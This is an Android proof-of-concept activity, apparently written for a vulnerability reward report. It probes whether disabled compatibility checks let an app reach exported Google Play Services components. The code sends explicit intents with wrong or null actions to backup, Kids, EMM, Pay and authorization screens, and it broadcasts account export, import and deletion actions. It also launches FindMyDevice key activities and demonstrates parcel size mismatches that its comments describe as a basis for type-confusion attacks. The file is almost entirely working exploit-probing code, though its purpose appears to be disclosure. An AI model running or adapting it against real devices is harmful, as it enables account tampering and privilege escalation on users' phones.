package com.vrp.poc;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CompatBypassPocActivity extends Activity {
    private static final String TAG = "CompatBypass";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("Android 17 Compat Changes Bypass PoC\n");
        logView.append("targetSdkVersion: 35\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testIntentFilterBypass();
        testNullActionIntents();
        testPendingIntentMutable();
        testAccountTransferBroadcast();
        testFindMyDeviceActivity();
        testAuthorizationActivity();
        testParcelHardeningStatus();
        log("\n=== ALL TESTS COMPLETE ===");
    }

    private void testIntentFilterBypass() {
        log("=== TEST 1: ENFORCE_INTENTS_TO_MATCH_INTENT_FILTERS bypass ===");
        log("CompatChange 161252188 is globally DISABLED");
        log("Testing explicit intents WITHOUT matching action to exported components...\n");

        // Test 1a: GMS BackupSettingsActivity - declared filter is VIEW+BROWSABLE
        // Send explicit intent with ACTION_MAIN (wrong action)
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.backup.component.BackupSettingsCollapsingActivity"));
            i.setAction("android.intent.action.MAIN");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] BackupSettings reached with non-matching action MAIN");
        } catch (SecurityException e) {
            log("[BLOCKED] BackupSettings: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] BackupSettings: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 1b: GMS FeatureDropsActivity - normally handles VIEW
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.growth.featuredrops.activity.FeatureDropsActivity"));
            i.setAction("android.intent.action.DELETE");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] FeatureDrops reached with non-matching action DELETE");
        } catch (SecurityException e) {
            log("[BLOCKED] FeatureDrops: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] FeatureDrops: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 1c: GMS GestureExchange ShareEducation - normally handles SYSTEM_TUTORIAL
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.gestureexchange.ui.ShareEducationActivity"));
            i.setAction("android.intent.action.SEND");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] ShareEducation reached with non-matching action SEND");
        } catch (SecurityException e) {
            log("[BLOCKED] ShareEducation: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] ShareEducation: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 1d: KidSetupActivity - handles HANDLE_MANAGED
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.kids.KidSetupActivity"));
            i.setAction("android.intent.action.VIEW");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("account_name", "test@gmail.com");
            startActivity(i);
            log("[BYPASS] KidSetup reached with non-matching action VIEW + extra account");
        } catch (SecurityException e) {
            log("[BLOCKED] KidSetup: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] KidSetup: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 1e: KidsAuthSetupActivity - also handles HANDLE_MANAGED
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.kids.auth.KidsAuthSetupActivity"));
            i.setAction("android.intent.action.VIEW");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] KidsAuthSetup reached with non-matching action VIEW");
        } catch (SecurityException e) {
            log("[BLOCKED] KidsAuthSetup: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] KidsAuthSetup: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 1f: EMM Activity - handles HANDLE_MANAGED
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.managed.ui.EmmActivity"));
            i.setAction("android.intent.action.VIEW");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] EmmActivity reached with non-matching action VIEW");
        } catch (SecurityException e) {
            log("[BLOCKED] EmmActivity: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] EmmActivity: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testNullActionIntents() {
        log("\n=== TEST 2: BLOCK_NULL_ACTION_INTENTS bypass ===");
        log("CompatChange 293560872 is globally DISABLED");
        log("Testing intents with null action to exported components...\n");

        // Test 2a: BackupSettings with null action
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.backup.component.BackupSettingsCollapsingActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // No action set - null action
            startActivity(i);
            log("[BYPASS] BackupSettings reached with NULL action");
        } catch (SecurityException e) {
            log("[BLOCKED] BackupSettings null: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] BackupSettings null: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 2b: GMS Nearby Sharing with null action
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.main.MainActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] NearbySharing reached with NULL action");
        } catch (SecurityException e) {
            log("[BLOCKED] NearbySharing null: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] NearbySharing null: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 2c: Google Pay with null action
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.pay.deeplink.AliasProcessImageResourceActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] Pay AliasProcess reached with NULL action");
        } catch (SecurityException e) {
            log("[BLOCKED] Pay AliasProcess null: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] Pay AliasProcess null: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test 2d: Authorization activity with null action
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.authorization.ui.AuthorizationActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[BYPASS] AuthorizationActivity reached with NULL action");
        } catch (SecurityException e) {
            log("[BLOCKED] AuthorizationActivity null: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] AuthorizationActivity null: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testPendingIntentMutable() {
        log("\n=== TEST 3: PendingIntent FLAG_MUTABLE test ===");
        log("Testing if we can create mutable PendingIntents and have them modified...\n");

        try {
            // Create a mutable PendingIntent (allowed for targetSdk < 31, and
            // PARCEL_HARDENING not enforced for targetSdk < 37)
            Intent base = new Intent("com.vrp.poc.TEST_ACTION");
            base.setComponent(new ComponentName(this, CompatBypassPocActivity.class));
            PendingIntent pi = PendingIntent.getActivity(this, 0, base, PendingIntent.FLAG_MUTABLE);
            log("Created mutable PendingIntent: " + pi.getCreatorPackage());
            log("Creator UID: " + pi.getCreatorUid());

            // Test if we can send the PendingIntent with modified extras
            Intent modified = new Intent();
            modified.putExtra("injected_key", "injected_value");
            modified.putExtra("escalated_action", true);
            pi.send(this, 0, modified);
            log("[INFO] Mutable PendingIntent sent with modified extras");
        } catch (Exception e) {
            log("[ERROR] PendingIntent: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testAccountTransferBroadcast() {
        log("\n=== TEST 4: Account Transfer broadcast injection ===");
        log("Testing if we can trigger account export/import...\n");

        // Test sending account transfer broadcasts
        String[] actions = {
            "com.google.android.gms.auth.START_ACCOUNT_EXPORT",
            "com.google.android.gms.auth.START_ACCOUNT_IMPORT",
            "com.google.android.gms.auth.ACCOUNT_EXPORT_DATA_AVAILABLE",
            "com.google.android.gms.auth.ACCOUNT_IMPORT_DATA_AVAILABLE"
        };

        for (String action : actions) {
            try {
                Intent i = new Intent(action);
                i.setPackage("com.google.android.gms");
                sendBroadcast(i);
                log("[SENT] Broadcast: " + action.substring(action.lastIndexOf('.') + 1));
            } catch (SecurityException e) {
                log("[BLOCKED] " + action.substring(action.lastIndexOf('.') + 1) + ": " + shorten(e.getMessage(), 80));
            } catch (Exception e) {
                log("[ERROR] " + action.substring(action.lastIndexOf('.') + 1) + ": " + e.getClass().getSimpleName());
            }
        }

        // Also try device account deletion broadcast
        try {
            Intent i = new Intent("com.google.android.gms.auth.STORE_DEVICE_ACCOUNT_DELETION_DATA");
            i.setPackage("com.google.android.gms");
            sendBroadcast(i);
            log("[SENT] STORE_DEVICE_ACCOUNT_DELETION_DATA broadcast");
        } catch (Exception e) {
            log("[ERROR] AccountDeletion: " + e.getClass().getSimpleName());
        }
    }

    private void testFindMyDeviceActivity() {
        log("\n=== TEST 5: FindMyDevice SyncOwnerKey ===");
        log("Testing access to exported FindMyDevice e2ee activities...\n");

        // SyncOwnerKeyActivity - handles SYNC_OWNER_KEY
        try {
            Intent i = new Intent("com.google.android.gms.findmydevice.spot.e2ee.ui.SYNC_OWNER_KEY");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.findmydevice.spot.e2ee.ui.SyncOwnerKeyActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[REACHED] SyncOwnerKeyActivity launched");
        } catch (Exception e) {
            log("[ERROR] SyncOwnerKey: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // ExportedSyncOwnerKeyActivityAlias
        try {
            Intent i = new Intent("com.google.android.gms.findmydevice.spot.e2ee.ui.SYNC_OWNER_KEY");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.findmydevice.spot.e2ee.ui.ExportedSyncOwnerKeyActivityAlias"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[REACHED] ExportedSyncOwnerKeyActivityAlias launched");
        } catch (Exception e) {
            log("[ERROR] ExportedAlias: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testAuthorizationActivity() {
        log("\n=== TEST 6: GMS Authorization Activity ===");
        log("Testing direct access to credential authorization...\n");

        // Try with correct action
        try {
            Intent i = new Intent("com.google.android.gms.auth.api.credentials.AUTHORIZATION");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.authorization.ui.AuthorizationActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("com.google.android.gms.auth.api.credentials.extra.SCOPE", "email profile");
            startActivity(i);
            log("[REACHED] AuthorizationActivity with AUTHORIZATION action");
        } catch (Exception e) {
            log("[ERROR] Authorization: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Try EMM with crafted extras
        try {
            Intent i = new Intent("com.google.android.gms.auth.account.HANDLE_MANAGED");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.managed.ui.EmmActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("accountName", "sandiyotest@gmail.com");
            i.putExtra("accountType", "com.google");
            startActivity(i);
            log("[REACHED] EmmActivity with HANDLE_MANAGED + account extras");
        } catch (Exception e) {
            log("[ERROR] EMM: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testParcelHardeningStatus() {
        log("\n=== TEST 7: PARCEL_HARDENING (416031865) status ===");
        log("enableSinceTargetSdk=37 — NOT enforced for any app targeting SDK < 37\n");

        // Test Parcel round-trip behavior
        try {
            // Create a Bundle, write to Parcel, read back
            Bundle b = new Bundle();
            b.putString("key1", "value1");
            b.putInt("key2", 42);

            // Nested bundle — the vector for LazyBundle attacks
            Bundle inner = new Bundle();
            inner.putString("nested_key", "nested_value");
            inner.putParcelable("intent", new Intent("android.intent.action.CALL", Uri.parse("tel:+1234567890")));
            b.putBundle("inner", inner);

            // Write to Parcel
            Parcel p = Parcel.obtain();
            b.writeToParcel(p, 0);
            int size = p.dataSize();
            log("Bundle serialized: " + size + " bytes");

            // Read back
            p.setDataPosition(0);
            Bundle recovered = p.readBundle(getClassLoader());
            recovered.keySet(); // force unparcel
            log("Bundle recovered: keys=" + recovered.keySet());
            if (recovered.containsKey("inner")) {
                Bundle innerRec = recovered.getBundle("inner");
                if (innerRec != null) {
                    innerRec.keySet();
                    log("Inner bundle: keys=" + innerRec.keySet());
                    Intent recoveredIntent = innerRec.getParcelable("intent");
                    if (recoveredIntent != null) {
                        log("Recovered Intent action: " + recoveredIntent.getAction());
                        log("Recovered Intent data: " + recoveredIntent.getData());
                    }
                }
            }
            p.recycle();
            log("[INFO] Parcel round-trip works without PARCEL_HARDENING enforcement");
        } catch (Exception e) {
            log("[ERROR] Parcel: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 100));
        }

        // Test Bundle size manipulation
        try {
            // Create two Bundles with same keys but different value types
            // This is the basis for type confusion attacks
            Bundle attack = new Bundle();
            attack.putString("type_field", "AAAA");

            Parcel p1 = Parcel.obtain();
            attack.writeToParcel(p1, 0);
            byte[] data1 = p1.marshall();
            log("Type string bundle: " + data1.length + " bytes");
            p1.recycle();

            Bundle attack2 = new Bundle();
            attack2.putInt("type_field", 0x41414141);

            Parcel p2 = Parcel.obtain();
            attack2.writeToParcel(p2, 0);
            byte[] data2 = p2.marshall();
            log("Type int bundle: " + data2.length + " bytes");
            log("Size difference: " + (data1.length - data2.length) + " bytes");
            log("[INFO] Size differences enable parcel cursor misalignment attacks");
            p2.recycle();
        } catch (Exception e) {
            log("[ERROR] Parcel size: " + e.getClass().getSimpleName());
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
